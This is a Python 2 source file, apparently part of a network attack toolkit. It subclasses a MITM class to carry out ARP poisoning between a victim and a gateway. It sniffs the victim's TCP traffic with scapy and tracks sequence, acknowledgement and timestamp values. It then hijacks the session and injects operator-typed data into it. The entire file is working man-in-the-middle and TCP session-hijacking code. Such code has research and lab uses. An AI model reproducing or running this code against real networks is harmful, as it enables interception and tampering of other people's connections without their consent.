__author__ = 'Nicholas Rodofile'

from MITM import *


class Injection(MITM):
    def __init__(self, victim=None, gateway=None, verbose=1,
                     pkt_count=1, interface_selected=None):

        MITM.__init__(self, victim=victim, gateway=gateway, verbose=verbose,
                      pkt_count=pkt_count, interface_selected=interface_selected)

        self.spoof_gateway = None
        self.spoof_victim = None
        self.pkt_counter = 0
        self.hijacked = False


    def process_packet(self, pkt):
        if self.hijacked is True:
            spoofer_gw = self.gateway.spoofer
            spoofer_vt = self.victim.spoofer
            if pkt.haslayer(Ether):
                if pkt.haslayer(TCP):
                    print pkt[TCP].seq, spoofer_gw.acknowledgement, "Seq, Ack"
                    print spoofer_gw.injected, "Injected"
                    print pkt[Ether].src, self.victim.mac_address, "Mac"
                    if (pkt[TCP].seq == spoofer_gw.acknowledgement) \
                            and spoofer_gw.injected \
                            and pkt[Ether].src == self.victim.mac_address:
                        spoofer_gw.ack_injection(pkt)
                        return

                    if pkt[Ether].dst == self.attacker.mac_address:
                        if pkt[Ether].src == self.gateway.mac_address:
                            if pkt[TCP].flags == 24:
                                spoofer_vt.gateway_responder(pkt)
                                return
                            if self.verbose:
                                print "DROPPING >> ", pkt.summary()
                            spoofer_vt.sequence_conf(pkt)
                            return
                        elif pkt[Ether].src == self.victim.mac_address:
                            spoofer_gw.sequence_conf(pkt)
                        else:
                            self.error("Forward Error!: ", pkt.summary())
                            return
        else:
            self.forward_packet(pkt)

    def injector(self):
        spoofer = self.gateway.spoofer
        num = 0
        while self.gateway.sequence <= 0 or self.victim.sequence <= 0:
            # wait for sequence numbers
            pass
        print "Connection is now compromised"
        while not self.hijacked:
            hijacked_input = str(raw_input("Enter \'h\' to High-jack connection\n"))
            if hijacked_input == "h":
                self.hijacked = True
        self.gateway.spoofer.timestamp = self.gateway.timestamp
        self.victim.spoofer.timestamp = self.victim.timestamp
        self.gateway.spoofer.timestamp_ecr = self.victim.timestamp_echo_response
        self.victim.spoofer.timestamp_ecr = self.gateway.timestamp_echo_response
        self.gateway.spoofer.start_time = time.time()
        self.victim.spoofer.start_time = time.time()
        print "Connection is now hijacked, listening for Injection"
        while self.attacking:
            num += 1
            inject = str(raw_input(""))
            if inject == "":
                spoofer.inject("INJECT "+str(num))
            else:
                spoofer.inject(inject)

    def start(self):
        self.attacking = True
        self.init_spoofing()
        filter_str = self.get_sniffing_filter()
        arp_poisoning_thread = Thread(target=self.arp_poisoning)
        arp_poisoning_thread.start()
        injector = Thread(target=self.injector)
        injector.daemon = True
        injector.start()
        if self.attacking:
            self.show_verbose(str="Filter: " + filter_str)
            self.show_verbose(str="Starting MITM and Injection attack")
            sniffed = sniff(prn=self.process_packet, filter=filter_str, count=int(self.pkt_count))
            self.save_capture(sniffed, "_injection_")
            self.show_verbose(str="Finished MITM and Injection attack")
        self.attacking = False
        injector.join(1)
        arp_poisoning_thread.join()


def Injection_conf(interface='eth0', verbose=1, pkt_count=30):
    gateway, victim = config_nodes(interface=interface)
    return Injection(interface_selected=interface, gateway=gateway, victim=victim, verbose=verbose, pkt_count=pkt_count)

def injection_attack(gateway, victim, pkt):
    return pkt